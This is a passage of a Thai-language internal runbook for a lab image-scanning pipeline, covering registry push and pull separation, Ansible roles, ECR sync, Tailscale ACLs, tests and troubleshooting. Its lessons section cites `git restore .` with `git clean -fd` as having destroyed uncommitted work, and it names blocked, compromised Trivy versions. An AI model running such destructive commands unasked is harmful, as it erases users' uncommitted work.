   - ตั้งสิทธิ์ไฟล์กลับเป็น root 0600 (htpasswd เขียนไฟล์ใหม่ สิทธิ์อาจเปลี่ยน)
   - ทุก task ที่แตะรหัสมี `no_log: true`
6. ลบ container `camp-registry` ตัวเก่าถ้ามี (เช็กด้วย `docker inspect` ก่อน เพราะ `docker rm -f` ตอบ 0 แม้ไม่มี container)
7. **สร้าง container ใหม่เฉพาะเมื่อ config เปลี่ยน:** คำนวณ hash จาก image + พอร์ต + checksum ของ config + checksum ของ htpasswd (เฉพาะ push) + mount แล้วติดเป็น label `vlab.registry.config-hash` ถ้า label ของตัวที่รันอยู่ไม่ตรง หรือ container ไม่ได้รัน → `docker rm -f` แล้ว `docker run` ใหม่
8. **ตรวจผลจริง:** `:5001/v2/` = 200, `:5002/v2/` ไม่มี auth = 401, `:5002/v2/` ด้วย user `ansible` = 200, เริ่ม upload ที่ `:5001` ต้องไม่ได้ 202

> **💡 Mentor:** ข้อ 7 คือเทคนิค "config hash label" ใช้ได้ทุกครั้งที่ต้องจัดการ container ด้วย `docker run` ตรงๆ
> เพราะ `docker run` ไม่มีโหมด "อัปเดต" ถ้าแค่เช็กว่ามี container ไหม จะพลาดตอนแก้ config แล้ว container เก่ายังรันต่อ
> Kubernetes ใช้หลักเดียวกันกับ Deployment (`pod-template-hash`)

> **💡 Mentor:** ข้อ 8 สำคัญกว่าที่เห็น role ที่ดีไม่ได้แค่ "สั่งแล้วจบ" แต่ **พิสูจน์ผลที่ต้องการ** ด้วย
> ถ้า readonly ไม่ทำงานเพราะพิมพ์ config ผิด role จะล้มทันที แทนที่จะเงียบไปจนมีคนมา push ผ่านได้

> **💡 Mentor:** ทำไม mount โฟลเดอร์ `auth/` แทนไฟล์ `htpasswd` ตรงๆ? เพราะ `htpasswd` เขียนไฟล์ใหม่ (inode ใหม่)
> แล้ว rename ทับ bind mount ของไฟล์เดี่ยวจะยังชี้ inode เก่า container จึงไม่เห็นรหัสใหม่ mount โฟลเดอร์จะเห็นเสมอ

### 8.4 ข้อจำกัดที่รู้อยู่
container bind `0.0.0.0` เครื่องที่อยู่ใน LAN เดียวกับ rn เข้า 5001/5002 ได้โดยไม่ผ่าน ACL ของ Tailscale (5002 ยังต้องมีรหัส) ถ้าจะปิด ให้ bind เฉพาะ IP ของ Tailscale หรือใช้ iptables chain `DOCKER-USER` (docker ข้าม ufw ปกติ)

### 8.5 ค่าตั้ง (`group_vars/all.yml`)
```yaml
registry_users:
  scanner:
    password: "..."   # Job สแกน (Secret registry-push)
  ansible:
    password: "..."   # scan-runner-image / build-images.yml
```
ค่าอื่นอยู่ใน `roles/registry/defaults/main.yml` (`registry_image`, `registry_pull_port`, `registry_push_port`, `registry_data_dir`, `registry_config_dir`, `registry_bcrypt_cost`, `registry_verify_user`)

**เปลี่ยนรหัส:** แก้ใน `all.yml` แล้วรัน role `registry` (htpasswd + restart push) และ role `k3s-server --tags scan` (Secret) ถ้าเป็นรหัสของ `scanner`

---

## 9. Ansible role อื่นที่เกี่ยวข้อง

play `Provision Virtual-Lab registry` ใน `site.yml` รัน role ตามลำดับ:
```yaml
- { role: common,            tags: ['common'] }
- { role: registry,          tags: ['registry'] }
- { role: scan-runner-image, tags: ['scan-runner', 'scan'] }   # ต้องรันหลัง registry
- { role: ecr-sync,          tags: ['ecr-sync'] }
```

### 9.1 `scan-runner-image`: build และ push scanner image
```bash
ansible-playbook -i inventory.yml site.yml -K --limit rn --tags scan-runner
```
1. **ตรวจ input:** image ทุกตัว pin ด้วย digest, เวอร์ชัน Trivy ตรงกับ tag ใน digest และไม่อยู่ใน `scan_runner_blocked_trivy_versions` (0.69.4-0.69.6), runner เป็น semver
2. **cosign verify** image ของ Trivy (container `--read-only --cap-drop=ALL`) ต้องเซ็นแบบ keyless โดย `aquasecurity/trivy/.github/workflows/reusable-release.yaml@refs/tags/v<version>` ผ่าน OIDC ของ GitHub Actions ไม่ผ่าน = หยุดทั้ง play
3. copy build context (`Dockerfile`, `.dockerignore`, `runner.py`, `policy.json`) ไป `/opt/vlab-scan-runner-build` (root, 0750)
4. คำนวณ **build hash** = sha256 ของ checksum ทุกไฟล์ + digest ของ Trivy และ base + เวอร์ชัน
5. `docker build --pull` ส่ง digest และเวอร์ชันเป็น build-arg ติด label `vlab.scan-runner.build-hash` และ tag เป็น `localhost:5002/vlab/scan-runner:<version>`

แม้แก้แค่คอมเมนต์ใน `runner.py` / `Dockerfile` build hash ก็เปลี่ยน ข้อ 7 จะไม่ยอม push ทับเวอร์ชันเดิม
6. ตรวจ image: user ต้องเป็น `10001:10001`, smoke test `version` ภายใต้ `--read-only --cap-drop=ALL --network=none` ต้องได้ Trivy ตรงเวอร์ชัน
7. **tag เป็น immutable:** อ่าน manifest เดิมผ่าน **`localhost:5001`** (ไม่ต้อง login) ไม่มี → push / hash เดิม → ไม่ push / hash ต่าง → **fail** ให้ขึ้นเวอร์ชัน (ยกเว้น `-e scan_runner_force_push=true`)
8. **push ผ่าน `localhost:5002`:** `docker login --password-stdin` (user `ansible`, `no_log`) → `docker push` → `docker logout` ใน `always` (ไม่ทิ้งรหัสไว้ใน `/root/.docker/config.json` แม้ push ล้ม)
9. แสดง `SCAN_RUNNER_IMAGE=<rn IP>:5001/vlab/scan-runner@sha256:...` (อ้างด้วยพอร์ต pull)

ใช้ `localhost` เพราะ docker เชื่อ registry HTTP บน localhost เองโดยไม่ต้องแก้ `insecure-registries`

### 9.2 `build-images.yml`: build lab image
```bash
ansible-playbook -i inventory.yml build-images.yml -K -e lab_image_filter=music-lab
```
- build บน rn (ส่ง source ไม่กี่ MB แทน image หลาย GB ข้าม Tailscale)
- tag / push ผ่าน push endpoint: `localhost:5002` ถ้า build บน rn, `<rn IP>:5002` ถ้า build เครื่องอื่น (`-e image_build_host=...`) พร้อม login / logout แบบเดียวกับ 9.1
- `insecure-registries` ใน `/etc/docker/daemon.json` **merge** กับค่าเดิม (เดิมเขียนทับทั้ง list) ใส่ pull endpoint และ push endpoint ถ้าไม่ใช่ localhost
- `task.yaml` ของ SkyPilot และการตรวจผลใช้ pull endpoint (`<rn IP>:5001`)

> **💡 Mentor:** lab image ที่ build ผ่าน Ansible **ไม่ผ่านการสแกน** เพราะเป็นของทีมเราเอง (trusted path) ต่างจาก
> ไฟล์ที่อาจารย์อัปโหลด การมีรหัส `ansible` แยกจาก `scanner` ทำให้ถ้าวันหนึ่งอยากบังคับสแกนทุก image
> ก็แค่ลบ user `ansible` ออก ไม่กระทบ Job สแกน

### 9.3 `k3s-server`: namespace + Secret ของ push (tag `scan`)
```bash
ansible-playbook -i inventory.yml site.yml -K --limit mn --tags scan
```
`--tags scan` รันเฉพาะ 4 task นี้ ไม่ restart k3s:
1. `Get registry-host IP from inventory`
2. `Apply lab image scan namespace (vlab-scan)`: apply `k8s/scan-namespace.yaml` (นับ changed จากบรรทัดที่ลงท้าย `configured` / `created`)
3. `Read current registry push credentials`: อ่าน Secret เดิม (`no_log`)
4. `Store registry push credentials for scan Jobs`: ถ้ายังไม่มี หรือค่าไม่ตรงกับ `registry_users.scanner` → `kubectl apply --server-side --field-manager=ansible` สร้าง Secret `registry-push` แบบ `kubernetes.io/basic-auth` (manifest ส่งทาง stdin, `no_log`)

ค่าใน `roles/k3s-server/defaults/main.yml`: `scan_push_secret: registry-push`, `scan_push_user: scanner`

`registries.yaml` ของ containerd (ทั้ง server และ agent) ประกาศแค่ `<rn IP>:5001` เป็น HTTP เพราะ K3s pull อย่างเดียว ส่วนการ push ของ Job ทำโดย skopeo ใน Pod ไม่ผ่าน containerd

> **💡 Mentor:** ทำไมต้อง `--server-side`? `kubectl apply` แบบปกติจะเก็บ manifest ทั้งก้อนไว้ใน annotation
> `kubectl.kubernetes.io/last-applied-configuration` เพื่อใช้คำนวณ diff รอบหน้า ถ้า manifest มี `stringData`
> รหัสจะถูกเก็บซ้ำเป็น **ข้อความธรรมดา** ใน annotation (ส่วน `.data` อย่างน้อยก็เป็น base64 และหลายเครื่องมือซ่อนไว้)
> server-side apply ไม่ใช้ annotation นี้ ตรวจได้ด้วย:
> ```bash
> kubectl -n vlab-scan get secret registry-push -o jsonpath='{.metadata.annotations}'; echo   # ต้องว่าง
> ```

### 9.4 `ecr-sync`: sync camp registry ขึ้น ECR
```bash
ansible-playbook -i inventory.yml site.yml -K --limit rn --tags ecr-sync
```
**ไม่ต้องแก้อะไรเลยตอนแยก pull/push** เพราะอ่านจาก `localhost:5001` อยู่แล้ว (read-only พอ)

#### role ทำอะไร (เมื่อ `ecr_sync_enabled: true`)
1. ตรวจ input: registry ต้องเป็น `<12 หลัก>.dkr.ecr.<region>.amazonaws.com`, access key ขึ้นต้น `AKIA`/`ASIA`, secret ยาว ≥ 40 (`no_log`)
2. ติดตั้ง `skopeo` และ `python3-boto3`
3. สร้าง system user `vlab-ecr-sync` (ไม่มี shell ไม่มี home)
4. วาง `ecr_sync.py` และ `policy.json` ที่ `/opt/vlab-ecr-sync`
5. เขียน `/etc/vlab-ecr-sync/config.env` (ค่าที่ไม่ลับ) และ `aws.env` (key) ทั้งคู่ root 0600 ในโฟลเดอร์ 0700
6. ติดตั้ง `vlab-ecr-sync.service` และ `vlab-ecr-sync.timer` แล้ว enable timer
7. รัน sync หนึ่งรอบทันที (`ecr_sync_run_now`) ไว้ตรวจว่า key, สิทธิ์ IAM และเครือข่ายใช้ได้ ถ้าล้ม playbook ล้ม

- config หรือสคริปต์เปลี่ยน → handler restart timer
- `--check` ข้ามการ enable และรันรอบแรก (ไฟล์ unit ยังไม่ถูกเขียนจริง)
- `ecr_sync_enabled: false` → หยุดและ disable timer แต่ไม่ลบไฟล์หรือ key

#### Timer (`vlab-ecr-sync.timer`)
เป็นตัวสั่งให้ `vlab-ecr-sync.service` (oneshot) รันซ้ำเป็นรอบๆ แทนการรันเป็น daemon ค้างไว้

| ค่า | ความหมาย |
|---|---|
| `OnBootSec=2min` | รอบแรกหลังเปิดเครื่อง 2 นาที |
| `OnActiveSec=30s` | รอบแรกหลัง timer ถูก start 30 วินาที |
| `OnUnitInactiveSec={{ ecr_sync_interval }}` (2min) | รอบถัดไปนับจากตอนรอบก่อน **จบ** รอบที่ copy นานจึงไม่ซ้อนกัน |
| `RandomizedDelaySec=15s` | สุ่มหน่วงเพิ่ม 0-15 วินาที |

ตัวนับเป็นนาฬิกาแบบ monotonic ช่วงที่เครื่องพักจะไม่นับ หลังตื่นอาจต้องสั่ง `sudo systemctl start vlab-ecr-sync.service` เอง

> **💡 Mentor:** systemd timer + oneshot service ดีกว่า cron ตรงที่มี log ใน journal, รอบไม่ซ้อนกัน
> (`OnUnitInactiveSec` นับจากรอบก่อนจบ) และใช้ hardening ของ systemd ได้ทั้งชุด ส่วนดีกว่า daemon ที่วน `while True`
> ตรงที่ไม่มี process ค้างกินหน่วยความจำ และถ้ารอบไหนพัง รอบหน้าเริ่มใหม่สะอาดเสมอ

#### Service (`vlab-ecr-sync.service`)
- รันเป็น user `vlab-ecr-sync` อ่าน `config.env` เป็น env
- key ส่งผ่าน `LoadCredential=aws.env:...` systemd copy เข้า `$CREDENTIALS_DIRECTORY` ให้ service นี้ตัวเดียว ไม่ผ่าน env หรือ argv
- `RuntimeDirectory` (0700) ใช้วาง authfile ชั่วคราว, `CacheDirectory` ใช้พัก blob ของ skopeo (ไม่ใช้ `/run` ที่เป็น RAM)
- hardening: `NoNewPrivileges`, ไม่มี capability, `ProtectSystem=strict`, `ProtectHome`, `PrivateTmp`, `PrivateDevices`, ปิด namespace / realtime / SUID, จำกัด address family และ syscall (`@system-service`), `UMask=0077`
- `TimeoutStartSec=6h`

#### push ขึ้น ECR ยังไง (`ecr_sync.py` ต่อหนึ่งรอบ)
1. อ่าน config: `ECR_REGISTRY`, `SOURCE_REGISTRY` (`localhost:5001`), `INCLUDE_REGEX` (`^vlab/`), `EXCLUDE_REGEX` (`^vlab/scan-runner$`), `MAX_COPIES` (20), `COPY_TIMEOUT` (3600) และ key จาก `$CREDENTIALS_DIRECTORY/aws.env`
2. อ่านรายการ repo จาก camp registry (`/v2/_catalog` รองรับ pagination) คัดตาม include / exclude และกติกาชื่อของ ECR
3. ต่อ repo: `describe_images` บน ECR ได้ map tag → digest (ยังไม่มี repo = `None`)
4. ต่อ tag: อ่าน digest ต้นทางด้วย `HEAD /v2/<repo>/manifests/<tag>`
   - digest ตรงกับ ECR → ข้าม
   - ECR มี tag นี้แต่ digest ต่าง → **ไม่เขียนทับ** log `conflict` และนับเป็น failure (repo บน ECR เป็น IMMUTABLE)
   - ECR ไม่มี → เข้ารายการที่ต้อง copy
5. ไม่มีอะไรต้อง copy → log `up to date` จบ (ไม่ขอ token ECR เลย)
6. ขอ token ECR (`get_authorization_token`) เขียนเป็น authfile 0600 ใน `$RUNTIME_DIRECTORY`
7. ต่อรายการ (ไม่เกิน `MAX_COPIES` ที่เหลือไปรอบหน้า)
   - `ensure_repository` สร้าง repo บน ECR ถ้ายังไม่มี: `IMMUTABLE`, scan on push, เข้ารหัส AES256, tag `managed-by=vlab-ecr-sync`
   - `skopeo copy --all --src-tls-verify=false --dest-authfile <authfile> docker://localhost:5001/<repo>:<tag> docker://<ECR>/<repo>:<tag>` (argv list ไม่ผ่าน shell)
   - อ่าน digest บน ECR อีกครั้ง ต้องตรงกับต้นทาง ไม่งั้น `digest mismatch`
8. ลบ authfile ทิ้งเสมอ (`finally`) แล้ว log `copied N, failed N, deferred N`
9. exit 1 ถ้ามี failure → service เป็น failed (เห็นใน `journalctl`) แล้วรอบหน้าลองใหม่

ไม่ลบอะไรบน ECR เลย image ที่ถูกลบจาก camp registry ยังอยู่บน ECR ให้ lifecycle policy ของ ECR จัดการ

**IAM:** user ของงานนี้แยกจาก SkyPilot มีสิทธิ์ตาม `ansible/roles/ecr-sync/files/iam-policy.json` คือ `ecr:GetAuthorizationToken` และสิทธิ์ push (`CreateRepository`, `TagResource`, `DescribeImages`, `BatchCheckLayerAvailability`, `BatchGetImage`, `InitiateLayerUpload`, `UploadLayerPart`, `CompleteLayerUpload`, `PutImage`) จำกัดที่ `repository/vlab/*`

#### เช็คบนเครื่อง registry
```bash
systemctl list-timers vlab-ecr-sync.timer          # รอบถัดไป
sudo journalctl -u vlab-ecr-sync.service -n 20 --no-pager
sudo systemctl start vlab-ecr-sync.service         # sync ทันที
curl http://localhost:5001/v2/_catalog             # ของใน camp registry
```

---

## 10. Tailscale ACL

### 10.1 ไฟล์
| ไฟล์ | คืออะไร |
|---|---|
| `tailscale/vlab-acl.hujson` | policy ทั้ง tailnet (HuJSON = JSON ที่มีคอมเมนต์และ comma ท้ายได้) |
| `tailscale/vlab-tags.tsv` | IP → tag (ต้องตรงกับ `ansible/inventory.yml`) |
| `script/tailscale-acl.sh` | ตั้ง policy + ติด tag ผ่าน API, backup, rollback, check |
| `tailscale/backup/` | policy ก่อนแก้ทุกครั้ง (gitignore เพราะเป็น policy ของ tailnet) |

### 10.2 ใครคุยกับใครได้

| จาก → ไป | พอร์ต | เหตุผล |
|---|---|---|
| คนในทีม (`autogroup:member`) → ทุกเครื่อง | ทั้งหมด | Ansible ssh, backend บน WSL → K3s API (6443) |
| server → ทุกเครื่อง | ทั้งหมด | kubelet (10250), metrics, ssh, **push :5002** |
| worker → server | tcp 6443 | K3s API / supervisor (ตาม `K3S_URL` ของ agent) |
| worker → worker, server | udp 8472 | flannel VXLAN (pod ↔ pod ข้ามเครื่อง, coredns บน master) |
| worker → registry | tcp **5001 เท่านั้น** | pull image |
| registry → ใคร | ไม่มี | ecr-sync ออกอินเทอร์เน็ตตรง ไม่ต้องคุยใน tailnet |

**tests ในไฟล์** (Tailscale รันทุกครั้งที่ validate / save ไม่ผ่าน = ไม่ยอม save):
- worker: accept `server:6443`, `registry:5001` / deny `registry:5002`, `registry:22`, `server:22,8000,8080,10250`, `worker:8080,8443,22,10250,30080`
- worker udp: accept `worker:8472`, `server:8472`
- server: accept `registry:5001,5002`, `worker:10250,22,8080`
- registry: deny `server:6443,22`, `worker:22,10250`

> **💡 Mentor:** Tailscale ACL ไม่มีกฎ deny มีแต่ accept ทุกอย่างที่ไม่ได้เขียนไว้จึงปิด (default deny)
> ข้อเสียคือ "เปิดทุกอย่างยกเว้นพอร์ตเดียว" ต้องเขียน dst ใหม่ทั้งหมด จึงคง member → `*:*` ไว้
> แล้วพึ่งรหัสของ 5002 แทน ส่วน `tests` คือ unit test ของ firewall ถ้าใครแก้ policy แล้วเผลอเปิด worker → 5002
> Tailscale จะไม่ยอม save ให้เลย

### 10.3 ทำไม Job สแกนต้องรันบน master
Pod ที่ออกนอก cluster ถูก flannel masquerade เป็น IP ของ node ที่ Pod รันอยู่ ถ้า Pod สแกนไปลง worker การ push จะออกไปด้วย IP ของ worker แล้วถูก ACL ปิด จึงใส่ `nodeSelector: node-role.kubernetes.io/control-plane: "true"` (K3s ติด label นี้ให้ master เอง)

ผลข้างเคียงที่ตั้งใจ: งานสแกน (ซึ่งรันโค้ดที่ไม่น่าเชื่อถือ คือไฟล์ของผู้ใช้) ไม่ไปแย่ง CPU / RAM ของเครื่องแลปที่นักศึกษาใช้

### 10.4 วิธีใช้ script
```bash
# จาก WSL ที่ root ของ repo (ต้องมี curl, jq, diff; check ต้องมี kubectl)
./script/tailscale-acl.sh plan                  # ดูอย่างเดียว: backup + validate + tests + diff + tag ที่จะติด
./script/tailscale-acl.sh apply                 # plan แล้วถามยืนยัน → ตั้ง policy → ติด tag
./script/tailscale-acl.sh rollback tailscale/backup/acl-<เวลา>.hujson
./script/tailscale-acl.sh check [node ...]      # debug pod hostNetwork บนทุก server / worker
```
- **token:** admin console → Settings → Keys → API access tokens → Generate access token **ตั้งอายุ 1 วัน** ให้หมดอายุเอง script ถามทุกครั้ง (พิมพ์แล้วไม่ขึ้นจอ) ส่งเข้า curl ทาง stdin ไม่อยู่ใน argv
- **เขียนแบบมี ETag:** ถ้ามีคนแก้ policy ใน console ระหว่างนั้น Tailscale ตอบ 412 แทนการเขียนทับ
- **`check`** หาชื่อ node จาก InternalIP (K3s ตั้ง `--node-ip` เป็น Tailscale IP) ใช้ image `<rn>:5001/vlab/scan-runner:1.1.0` (มี python3 ใช้ต่อ TCP / DNS แทน `nc`) `imagePullPolicy: Always` จึงพิสูจน์ไปด้วยว่า node นั้น pull ผ่าน ACL ได้

**ไม่มี kubectl ในเครื่องที่สั่ง?** ทดสอบด้วย curl บนเครื่องจริงได้ผลเท่ากัน:
```bash
# บน worker
curl -s -m 5 -o /dev/null -w '5001: %{http_code}\n' http://100.119.124.73:5001/v2/   # 200
curl -s -m 5 -o /dev/null -w '5002: %{http_code}\n' http://100.119.124.73:5002/v2/   # 000 (ACL ปิด)
curl -sk -m 5 -o /dev/null -w '6443: %{http_code}\n' https://100.99.154.106:6443/    # 401 (ต่อได้)
# บน master
curl -s -m 5 -o /dev/null -w '5002: %{http_code}\n' http://100.119.124.73:5002/v2/   # 401 (ต่อได้ ต้อง login)
```

> **💡 Mentor:** อ่านรหัส HTTP ให้เป็น `000` = ต่อไม่ติดเลย (firewall / ไม่มีใครฟัง) / `401` = ต่อติดแต่ไม่มีสิทธิ์
> / `200` = ผ่าน แค่สามตัวนี้ก็แยกได้ทันทีว่าปัญหาอยู่ชั้นเครือข่ายหรือชั้น auth

---

## 11. Deploy ตั้งแต่ศูนย์ (runbook)

ลำดับนี้สำคัญ ข้อหลังพึ่งข้อก่อน

| # | ทำอะไร | คำสั่ง (จาก `ansible/` ใน WSL) | ตรวจ |
|---|---|---|---|
| 1 | ใส่ `registry_users` ใน `group_vars/all.yml` | — | รหัส ≥ 12 ตัว, มี `scanner` และ `ansible` |
| 2 | registry + scanner + ecr-sync บน rn | `ansible-playbook -i inventory.yml site.yml -K --limit rn` | `curl rn:5001/v2/_catalog` มี `vlab/scan-runner` |
| 3 | namespace + Secret บน master | `ansible-playbook -i inventory.yml site.yml -K --limit mn --tags scan` | annotation ของ Secret ว่าง, egress มี 5002 |
| 4 | ACL | `./script/tailscale-acl.sh plan` → `apply` (จาก root ของ repo) | curl ตามข้อ 10.4 |
| 5 | backend | `.env`: `DOCKER_REGISTRY_HOST=<rn>:5001`, `REGISTRY_PUSH_PORT=5002`, `LAB_IMAGE_SCAN_ENABLED=True`, `K8S_ENABLED=True` แล้ว restart | log ของ backend มี reconciler เริ่มทำงาน |
| 6 | ทดสอบครบวงจร | อัป tar ผ่าน UI (repository `vlab/...`) | ข้อ 11.1 |

ถ้าเครื่องใหม่ทั้งหมด (ยังไม่มี K3s) ให้รัน `site.yml` เต็มสำหรับ mn และ wn1 ก่อนข้อ 3

### 11.1 ทดสอบครบวงจร
```bash
# บน masterpc
kubectl -n vlab-scan get pods -o wide -w
```
ผลที่ต้องเห็น: Pod `scan-...` ขึ้นภายใน ~15 วินาที, `NODE` = masterpc, `Init:0/3` → `Init:1/3` → `Init:2/3` → `Running` → `Completed`, หน้าเว็บเป็น PASSED, `curl http://100.119.124.73:5001/v2/_catalog` มี repo นั้น, ภายใน ~2 นาที `journalctl -u vlab-ecr-sync` บน rn บอกว่า copy ขึ้น ECR

> **💡 Mentor:** สังเกตว่า runbook ทุกข้อมีคอลัมน์ "ตรวจ" ทำข้อต่อไปก่อนตรวจข้อนี้คือสาเหตุอันดับหนึ่ง
> ที่ทำให้ debug ยาก เพราะพอพังตอนท้าย จะไม่รู้ว่าพังมาตั้งแต่ข้อไหน

---

## 12. Test

### 12.1 runner (`scan-runner/tests/`)
```bash
python3 -m pytest scan-runner/tests        # ไม่ต้องมี docker / skopeo จริง
```
`test_push.py` (9 ข้อ) แทน `run_tool` ด้วยของปลอมที่จดว่าถูกเรียกด้วย argv อะไรและ authfile มีเนื้อหาอะไร:
- push ใช้ authfile 0600 ที่มี `scanner:<รหัส>` เป็น base64, รหัสไม่อยู่ใน argv, authfile ถูกลบหลัง push
- push ล้ม = `ERROR retryable` และ authfile ถูกลบ, reason ไม่มีรหัส
- skopeo timeout (exception) authfile ก็ยังถูกลบ
- ไม่มีไฟล์ username / password = `ERROR` ไม่ retry และไม่เรียก skopeo
- username ผิดรูปแบบ / password ว่าง / มีขึ้นบรรทัด = ปฏิเสธ
- `\n` ท้ายไฟล์ Secret ถูกตัด

### 12.2 backend
```bash
cd web-portal/backend
.venv/bin/python -m pytest tests            # ต้องมี Postgres และ DB virtual_lab_test
```
- conftest **ไม่สร้าง DB ให้** สร้างครั้งแรกใน Postgres เดียวกับ `DATABASE_URL` (`CREATE DATABASE virtual_lab_test`) ชื่อต้องลงท้าย `_test` (conftest กันไว้ไม่ให้ลบ DB จริง)
- ต่อ DB ไม่ได้ test ที่ใช้ DB จะถูก **skip** ไม่ใช่ fail ดูตัวเลข skipped ทุกครั้ง อย่าเห็นแค่ "passed" แล้วเชื่อ
- `tests/lab_image/test_scan_launch.py` ตรวจ manifest: secret ของ fetch อยู่แค่ใน `fetch`, secret ของ push อยู่แค่ใน `publish`, `REGISTRY` = `:5002`, ไม่มี env ชื่อ `*PASSWORD*`, `nodeSelector` ปิดได้ด้วย `{}`, การคำนวณ `registry_push_host`

> **💡 Mentor:** test ที่ดีของโค้ดความปลอดภัยไม่ได้ทดสอบแค่ "ทำงานได้" แต่ทดสอบ **"ไม่รั่ว"** ด้วย เช่น
> "รหัสไม่อยู่ใน argv", "authfile ถูกลบแม้ crash" สิ่งเหล่านี้คือสิ่งที่คนแก้โค้ดรุ่นถัดไปจะเผลอทำพังโดยไม่รู้ตัว

---

## 13. ดูสถานะและแก้ปัญหา

```bash
# บน master
kubectl -n vlab-scan get pods -o wide -w
kubectl -n vlab-scan logs <pod> -c fetch        # validate / scan / publish
kubectl -n vlab-scan describe pod <pod>         # Pod ค้าง: ดู Events
kubectl -n vlab-scan get pod <pod> -o jsonpath='{.status.containerStatuses[?(@.name=="publish")].state.terminated.message}'
kubectl -n vlab-scan delete jobs -l vlab/scan=true   # ก่อนรีเซ็ต DB
```
log ของแต่ละ container อยู่ในรูป `[vlab-scan] <ขั้น>: ok` / `FAIL - <เหตุผล>` / `skipped (verdict already ...)` ต้องดูก่อน reconciler ลบ Job (ประมาณ 15 วินาทีหลังจบ) ดูไม่ทันผลยังอยู่ใน DB ที่ `scan_summary`

| สถานะ Pod | ขั้น |
|---|---|
| `Init:0/3` | `fetch` (หรือยังรอ Secret / pull image) |
| `Init:1/3` | `validate` |
| `Init:2/3` | `scan` (นานสุด เพราะโหลด Trivy DB) |
| `PodInitializing` / `Running` | `publish` |
| `Completed` | จบแล้ว ผลจริงดูใน DB (`scan_status`, `scan_summary`) |

ชื่อ Pod `scan-<id 12>-<etag 8>-a<ครั้งที่>-xxxxx` ถ้าเห็น `a2` แปลว่ารอบแรกถูก retry

### อาการ → สาเหตุ → แก้

| อาการ | สาเหตุที่เป็นไปได้ | ดู / แก้ |
|---|---|---|
| อัปแล้วไม่มี Pod ขึ้นเลย | backend ไม่ได้ restart / `LAB_IMAGE_SCAN_ENABLED` ปิด / ไม่มี registry | log ของ backend, `.env` |
| Pod `Pending` | ไม่มี node ตรง `nodeSelector` / quota เต็ม | `describe pod` → Events, `kubectl get node --show-labels` |
| ค้าง `ContainerCreating` นาน | Secret `registry-push` หรือ Secret ของ URL ไม่มี | Events มี `secret "..." not found` → รัน `--limit mn --tags scan` |
| `ErrImagePull` | node ต่อ :5001 ไม่ได้ (ACL) / ไม่มี image เวอร์ชันนั้น | curl :5001 จาก node นั้น, `_catalog` / `tags/list` |
| publish: `push to registry failed: ... unauthorized` | รหัสใน Secret ไม่ตรงกับ htpasswd | รัน role `registry` และ `k3s-server --tags scan` ด้วย `all.yml` เดียวกัน |
| publish: `... i/o timeout` / `connection refused` | ACL หรือ NetworkPolicy ปิด 5002 / Pod ไม่ได้อยู่บน master | `get pods -o wide`, egress ports, curl :5002 จาก master |
| publish push เข้า `:5001` แล้วล้ม (read-only) และ log ขึ้น runner 1.0.0 | backend ยังเป็นโค้ดเก่า (`SCAN_RUNNER_VERSION` 1.0.0, ไม่รู้จัก push port) | pull โค้ดล่าสุดแล้ว restart backend |
| publish: `registry push credentials are not mounted` | ตั้ง `SCAN_RUNNER_IMAGE` เป็น 1.1.0 เองแต่ backend ไม่ได้ mount `/secrets/push` | ใช้ backend เวอร์ชันเดียวกับ runner |
| ERROR `download failed: HTTP 404` | ไฟล์หายจาก R2 | อาจารย์อัปใหม่ |
| scan ERROR บ่อยๆ | โหลด Trivy DB ไม่ได้ (rate limit / เน็ต) | log ของ `scan` |
| image ผ่านแต่ไม่ขึ้น ECR | ecr-sync ล้ม / conflict (tag เดิม digest ต่าง) | `journalctl -u vlab-ecr-sync` บน rn |

> **💡 Mentor:** วิธี debug ที่ใช้ได้กับทุกระบบ: **ไล่ตามเส้นทางของข้อมูลจากต้นไปปลาย** แล้วหาจุดแรกที่ผิด
> ไฟล์ขึ้น R2 ไหม → แถวเป็น QUEUED ไหม → มี Job ไหม → Pod ลง node ไหน → container ไหนล้ม → log ว่าอะไร
> อย่าเดาจากปลายทาง

---

## 14. บทเรียนจากการสร้างระบบนี้

เรื่องจริงที่เจอระหว่างทำ (2026-10-29/30) แต่ละข้อมีบทเรียนที่เอาไปใช้ต่อได้

1. **`git restore .` + `git clean -fd` ลบงานที่ยังไม่ commit หายถาวร** ระบบนี้เคยหายไปรอบหนึ่งเพราะแบบนี้ และโค้ดยังอ้างถึง `LAB_IMAGE_SCAN_ARCHITECTURE.md` กับ `SCAN_RUNNER_IMAGE.md` ที่ไม่มีอยู่ใน repo แล้ว (ตอนนี้รวมเนื้อหาไว้ในเอกสารนี้แทน)
   → commit บ่อยๆ ทีละเรื่องที่ทดสอบผ่าน และใช้ `git stash` แทน `restore` ถ้าไม่แน่ใจ
2. **typo ใน role ที่ไม่ได้ใช้ ทำให้ทั้ง playbook ล้ม:** `ansible.builtin.Environment:` (ควรเป็น keyword `environment:`) ใน role SIEM ทำให้ `site.yml` parse ไม่ผ่าน แม้จะรันแค่ `--limit rn --tags registry`
   → Ansible parse ทุก play ก่อนรัน ให้รัน `ansible-playbook --syntax-check` ใน CI
3. **`docker rm -f` ตอบ exit 0 แม้ไม่มี container** ทำให้ `changed_when: rc == 0` ผิด
   → อย่าเชื่อ exit code ของคำสั่งที่ "force" ให้เช็กสถานะก่อน (`docker inspect`)
4. **`changed_when: "'unchanged' not in stdout"` ผิดเมื่อไฟล์มีหลาย resource** namespace unchanged แต่ NetworkPolicy configured ก็ถูกรายงานเป็น ok
   → ถาม "มีอะไรเปลี่ยนไหม" (`configured|created`) แทน "มีอะไรไม่เปลี่ยนไหม"
5. **ACL ที่คิดว่าเก่า จริงๆ ถูกแก้ไว้แล้ว** diff ตอน `plan` เผยว่า policy บน Tailscale แยก 5001/5002 ไว้ก่อนแล้ว
   → อย่าเดาสถานะของระบบ ดูของจริงก่อนเสมอ (นี่คือเหตุผลที่ script มี `plan`)
6. **`kubectl get pods -o -w` ผิด** `-o` ต้องตามด้วย format (`wide`) แล้ว `-w` เป็นอีก flag หนึ่ง: `-o wide -w`
7. **test ที่ "ผ่าน" อาจแค่ถูก skip** ครั้งแรกที่รัน backend test ได้ `21 passed, 115 skipped` เพราะไม่มี Postgres
   → ดูตัวเลข skipped ทุกครั้ง

---

## 15. รีวิวความพร้อมและงานค้าง

### ทำได้ดีแล้ว
- **Supply chain:** pin digest ทุก image, ตรวจ cosign ก่อน build, บล็อก Trivy ที่ถูกวางโค้ดร้าย, ไม่มี pip dependency
- **Hardening:** non-root, read-only rootfs, ถอด setuid, ลบ `apk`, `python3 -I`, เรียก tool ไม่ผ่าน shell
- **แยก secret:** URL อยู่ใน `fetch` ตัวเดียว, รหัส registry อยู่ใน `publish` ตัวเดียว ผ่าน authfile ชั่วคราว, backend ไม่รู้รหัส
